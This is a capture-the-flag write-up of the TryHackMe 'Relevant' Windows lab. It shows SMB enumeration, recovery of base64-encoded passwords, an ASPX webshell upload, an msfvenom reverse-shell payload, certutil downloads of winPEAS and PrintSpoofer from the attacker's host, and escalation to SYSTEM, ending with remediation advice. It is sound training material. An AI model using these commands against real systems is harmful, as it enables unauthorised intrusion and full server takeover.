# Write-up: Relevant lab on THM

This document is a structured security write-up based on hands-on exploitation of the **Relevant** lab on TryHackMe website: https://tryhackme.com/room/relevant

**Date**: January 14, 2026  
**Source**: TryHackMe — Relevant & Personal Study Notes

---

## Summary

Standalone web server "Relevant" was fully compromised by the next few steps:  
* Share "nt4wrksv" is writable for any anonymous in smbclient — it's easy Remote Code Execution.
* Remote Code Execution -> Reverse Shell -> full ability of machine movement for a hacker and full ability of privilege escalation vector research — comfortable and easy POST work for a hacker.
* Critical Windows server misconfiguration — user "iis apppool\defaultapppool" has privilege "SeImpersonatePrivilege", what means a hacker can run thing called "PrintSpoofer" and get SYSTEM (full access to the server) easy and fast.
* As result — a hacker got SYSTEM and standalone web server "Relevant" was fully compromised.

---

## Technical Overview
### 1. Discovery

Start like always:  
```bash
$ sudo nmap -sC -sV -v -Pn -p- 10.80.131.73
```

Results:  
```text
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-01-14T17:10:46+00:00
|_ssl-date: 2026-01-14T17:11:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-13T17:03:25
| Not valid after:  2026-07-15T17:03:25
| MD5:     64f0 bf68 2f3d df1a d706 7048 7a2d 0d08
| SHA-1:   5582 e854 af4d be9c 05ef e9fa fe31 7ab0 c08b 0dbc
|_SHA-256: 06fe 4299 6fea 2780 1b70 4e15 e5f3 9b6e 17c3 477e 57ea 3ada 9de6 441e 8bd0 3b22
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows
```

*Here is standalone web server **"Relevant"**.*

---

Look for http port 80:  
* **http://10.80.131.73** — stock Windows Server 2016 web page, nothing interesting in there.

Check it out with fuzzing:  
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://10.80.131.73/FUZZ" -ic -c
```

*Nothing.*

---

Look for available shares:  
```bash
$ smbclient -L //10.80.131.73/ -N
```

Result:  
```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
```

Catch it. **"nt4wrksv"** it's someting interesting.

```bash
$ smbclient //10.80.131.73/nt4wrksv -N
```

```powershell
smb: \> ls
```

```text
passwords.txt
```

```powershell
mget passwords.txt
```

```bash
$ cat passwords.txt
```

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Go to https://gchq.github.io/CyberChef:  
```text
From Base64:
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

*Some credentials.*

Verify Bob's credentials:  
```bash
$ nxc smb 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
```

Bob positive:  
```text
[+] Relevant\Bob:!P@$$W0rD!123
```

Verify Bill's credentials: 

```bash
$ nxc smb 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
```

Bill positive:  
```text
[+] Relevant\Bill:Juw4nnaM4n420696969!$$$ (Guest)
```

*Two users in our pocket.*

---

```bash
$ nxc rdp 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
```

```bash
$ nxc rdp 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
```

No RDP for both.

**But there is one critical thing — we can write in the share "nt4wrksv" as anonymous, that means no account required for RCE.**

---

### 2. Penetration

Check for RCE first:  
```text
/usr/share/webshells/aspx/cmdasp.aspx -> smbclient
```

```powershell
> put cmdasp.aspx
```

Navigate: "http://10.80.131.73:49663/nt4wrksv/cmdasp.aspx"

Then:
```text
whoami
```

```text
"iis apppool\defaultapppool"
```

*There is RCE.*

---

Create reverse shell via msfvenom:  
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.226 LPORT=4444 -f aspx -o shell.aspx
```
Then move shell.aspx -> smbclient:

```powershell
> put shell.aspx
```

*Completed.*

---

```text
c:\Users\Bob\Desktop>type user.txt
```

```text
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

*User Flag in our pocket. Light weight, baby*

---

### 3. Escalation

---

Send **"winPEAS"** to the target:  
```powershell
certutil -urlcache -split -f http://192.168.144.226/winPEAS.ps1 wp.ps1
```

Run it:  
```powershell
powershell -ep bypass
```

```powershell
powershell .\wp.ps1 > output.txt
```

output.txt:  
```text
Privilege "SeImpersonatePrivilege" is Enabled
```

*We can run "PrintSpoofer" and get SYSTEM via "potato" vector.*

---

```powershell
certutil -urlcache -split -f http://192.168.144.226/PrintSpoofer64.exe PS64.exe
```

```powershell
> PS64.exe -i -c cmd
```

```text
PS64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```powershell
> whoami
```

```text
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop>type root.txt
```

Root Flag:  
```text
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## Security Failures & Root Causes Classification

Access Control — Anonymous Write Access on SMB Share — Critical impact — The nt4wrksv share was configured with "Full Control" or "Write" permissions for anonymous/guest users, allowing the upload of malicious .aspx payloads.
Improper Authorization — Excessive Service Account Privileges — High impact — The "iis apppool\defaultapppool" account held SeImpersonatePrivilege, which is unnecessary for standard web operations and enables token impersonation attacks.
Information Disclosure — Cleartext/Base64 Credentials in Share — Medium impact — Sensitive data (passwords.txt) was stored in a publicly accessible directory — Base64 is an encoding, not encryption, providing no security.
Configuration Management — Insecure Default IIS Deployment — Medium impact — The web server was running with default configurations and mapping high-numbered ports (49663) to sensitive SMB directories, increasing the attack surface.

---

## Remediation Recommendations

* Disable anonymous/guest access on all SMB shares
* Remove SeImpersonatePrivilege from service accounts where not strictly required
* Implement Group Managed Service Accounts (gMSAs) to handle service permissions securely
* Enforce strict NTFS permissions to prevent web-writable directories
* Prohibit cleartext or encoded credential storage in shared folders
* Audit privilege assignments regularly to prevent privilege creep on default app pools

---

## Conclusion

This lab demonstrates how misconfiguration beats exploitation. No sophisticated malware or memory corruption was required—only the abuse of over-privileged trust relationships and weak operational discipline. By exposing a writable SMB share and granting a web service account unnecessary impersonation rights, the server provided a clear, repeatable path from anonymous access to full SYSTEM compromise. This attack path is a realistic and devastating reminder that security is only as strong as its most basic configuration.

---

*Write-up compiled based on TryHackMe Attacktive Directory (https://tryhackme.com/room/relevant) lab.*
